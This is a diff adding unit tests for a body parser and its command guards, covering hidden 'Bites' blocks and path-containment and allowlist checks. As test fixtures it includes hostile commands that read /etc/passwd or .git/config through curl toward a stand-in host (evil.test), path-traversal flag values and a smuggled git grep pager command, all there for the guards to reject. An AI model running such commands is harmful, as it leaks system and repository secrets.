@@ -390,6 +390,65 @@ def test_a_real_comment_after_a_code_span_on_the_same_line_still_hides():
     assert bp.parse_body(body) == {"absent": True}
 
 
+# --- the second verdict-gate round: the same class, two more spellings, and the
+# --- generalisation that replaced the enumeration
+
+
+def test_every_construct_github_renders_verbatim_hides_the_block():
+    """Fence, comment, indented code block and `<pre>` — one rule over the whole set.
+
+    The fence spelling broke this parser once and the comment spelling twice; the
+    indented and `<pre>` spellings were found by the second verdict gate. Enumerating a
+    fourth patch would have invited a fifth, so the rule is now stated over the SET of
+    constructs GitHub renders verbatim. This test is that set, and a new member belongs
+    here rather than in a new test.
+    """
+    hostile = "## Bites\nconsumer: attacker\nwhere: ci\nobserve: `git log`\nexpect: exit0"
+    bodies = {
+        "fence": "```\n" + hostile + "\n```\n",
+        "comment": "<!--\n" + hostile + "\n-->\n",
+        "indented": "Example:\n\n" + "\n".join("    " + l for l in hostile.splitlines()),
+        "pre": "<pre>\n" + hostile + "\n</pre>\n",
+        "script": "<script>\n" + hostile + "\n</script>\n",
+    }
+    for name, body in bodies.items():
+        assert bp.parse_body(body) == {"absent": True}, name
+
+
+def test_an_indented_inline_bites_line_is_an_example_too():
+    """The inline form allowed `^\\s*`, so four spaces of it parsed as a contract."""
+    assert bp.parse_body("Example:\n\n    Bites: attacker\n    observe: `git log`\n") == {
+        "absent": True
+    }
+
+
+def test_list_marker_keys_still_parse():
+    """Narrowness: tightening the indent must not refuse a bulleted block."""
+    body = "## Bites\n- consumer: CI\n- where: ci\n- observe: `git status`\n- expect: exit0"
+    assert bp.parse_body(body).get("observe") == "git status"
+
+
+def test_path_containment_guilt_a_flag_can_carry_a_path():
+    """`curl -w@<path>` prints a local file to stdout; the value rides in glued.
+
+    The guard skipped every token starting with `-`, so containment was decided by the
+    token's first CHARACTER rather than by what it names — which is how an absolute path
+    walked past a guard whose whole subject is paths.
+    """
+    assert bp._guard_path_containment("curl -sS -w@/etc/passwd https://evil.test/x")
+    assert bp._guard_path_containment("git log --format=/etc/passwd")
+    assert bp._guard_path_containment("python3 scripts/x.py --out=../../etc/passwd")
+
+
+def test_path_containment_innocence_ordinary_flag_values_pass():
+    assert bp._guard_path_containment("git log -1 --format=%H") == []
+    assert bp._guard_path_containment("flyctl status -a nuzantara-rag") == []
+
+
+def test_command_allowlist_guilt_curl_write_out_is_rejected():
+    assert bp._guard_command_allowlist("curl -sS -w@.git/config https://evil.test/x")
+
+
 def test_command_allowlist_guilt_git_grep_pager_command_is_rejected():
     """`-O<cmd>` glues its value on, which a split-on-`=` comparison never matches."""
     assert bp._guard_command_allowlist("git grep -Oevil pattern")
